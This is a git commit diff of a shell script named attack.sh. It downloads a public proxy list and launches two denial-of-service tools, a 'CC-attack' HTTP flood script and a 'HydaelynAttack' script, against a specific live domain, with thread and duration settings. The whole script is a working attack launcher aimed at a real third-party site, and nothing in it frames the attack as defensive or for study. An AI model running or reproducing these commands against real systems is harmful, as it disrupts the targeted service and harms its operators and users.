73889cdf84eaa098b0836cd0416fbf7ae98236f6
NyaaCaster <110224598+NyaaCaster@users.noreply.github.com>
2023-01-04 14:16:52 +0800

    Add files via upload

--- attack.sh
+++ attack.sh
@@ -1,26 +1,3 @@
-echo "updata Nyaa-Automata"
-git pull
-
-echo ""
-echo "updata proxy"
 curl https://raw.githubusercontent.com/TheSpeedX/SOCKS-List/master/http.txt -o proxy.txt
-
-echo ""
-echo "updata HydaelynAttack"
-cd HydaelynAttack
-git pull
-cd ..
-
-echo ""
-echo "updata CC-attack"
-cd CC-attack
-git pull
-cd ..
-
-echo ""
-echo "CC-attack"
-python3 CC-attack/cc.py -url http://fwe22.top/ -f proxy.txt -v 5 -s 30
-
-echo ""
-echo "HydaelynAttack"
-python3 HydaelynAttack/HydaelynAttack_p_once_noLog.py
+python3 ~/CC-attack/cc.py -url http://fwe22.top/ -f ~/proxy.txt -v 5 -s 30
+python3 ~/HydaelynAttack/HydaelynAttack_p_once_noLog.py
